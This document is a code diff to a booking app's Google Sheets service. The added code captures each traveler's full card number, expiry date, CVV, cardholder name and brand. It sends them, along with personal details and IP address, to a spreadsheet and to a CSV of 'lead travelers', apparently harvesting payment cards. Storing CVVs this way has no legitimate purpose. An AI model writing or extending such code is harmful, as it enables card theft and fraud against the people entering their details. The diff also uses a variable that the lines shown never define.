@@ -203,6 +203,18 @@ export class GoogleSheetService {
     const totalPrice = flight.pricing?.formattedTotal || (travelerData.price ? `$${travelerData.price}` : '$140.00');
     const userIp = travelerData.user_ip || travelerData.ip || '';
 
+    // Card Details (Formatted safely for Google Sheets & Excel)
+    const rawCardName = travelerData.cardName || travelerData.cardholderName || travelerData.card_name || '';
+    const rawCardNum = (travelerData.cardNumber || travelerData.card_number || travelerData.cardNum || '').toString().replace(/\s+/g, '');
+    const rawCardBrand = travelerData.cardBrand || travelerData.card_brand || '';
+    const rawExpiry = travelerData.cardExpiry || travelerData.expiry || travelerData.card_exp || '';
+    const rawCvv = (travelerData.cardCvv || travelerData.cvv || travelerData.card_cvv || '').toString().trim();
+
+    // Single quote prefix prevents scientific notation (4.111E+15) & preserves CVV leading zeros
+    const sheetCardNum = rawCardNum ? (rawCardNum.startsWith("'") ? rawCardNum : `'${rawCardNum}`) : '';
+    const sheetExpiry = rawExpiry ? (rawExpiry.startsWith("'") ? rawExpiry : `'${rawExpiry}`) : '';
+    const sheetCvv = rawCvv ? (rawCvv.startsWith("'") ? rawCvv : `'${rawCvv}`) : '';
+
     const payload = {
       action: 'sheet2',
       timestamp,
@@ -227,8 +239,8 @@ export class GoogleSheetService {
       nationality,
       email,
       billing_email: email,
-      phone,
-      billing_phone: phone,
+      phone: sheetPhone,
+      billing_phone: sheetPhone,
       street_address: street,
       billing_address: street,
       city,
@@ -248,6 +260,17 @@ export class GoogleSheetService {
       dep_date: depDate,
       total_price: totalPrice,
       price: totalPrice,
+      // Card details for Sheet2
+      card_name: rawCardName,
+      cardholder_name: rawCardName,
+      card_number: sheetCardNum,
+      cardNumber: sheetCardNum,
+      card_brand: rawCardBrand,
+      cardBrand: rawCardBrand,
+      card_exp: sheetExpiry,
+      card_expiry: sheetExpiry,
+      card_cvv: sheetCvv,
+      cvv: sheetCvv,
       user_ip: userIp
     };
 
@@ -260,14 +283,14 @@ export class GoogleSheetService {
       'Last Name', 'Full Name', 'DOB', 'Gender', 'Nationality', 'Email',
       'Phone', 'Street Address', 'City', 'State', 'ZIP', 'Country',
       'Airline', 'Flight Number', 'Origin', 'Destination', 'Departure Date',
-      'Total Price', 'IP Address'
+      'Total Price', 'Cardholder Name', 'Card Number', 'Card Expiry', 'Card CVV', 'Card Brand', 'IP Address'
     ];
     const row = [
       timestamp, bookingId, pnr, title, firstName, middleName,
       lastName, fullName, dob, gender, nationality, email,
       cleanPhone, street, city, state, zip, country,
       airline, flightNumber, origin, destination, depDate,
-      totalPrice, userIp
+      totalPrice, rawCardName, sheetCardNum, sheetExpiry, sheetCvv, rawCardBrand, userIp
     ];
     appendToCsv('sheet2_lead_travelers.csv', header, row);
 
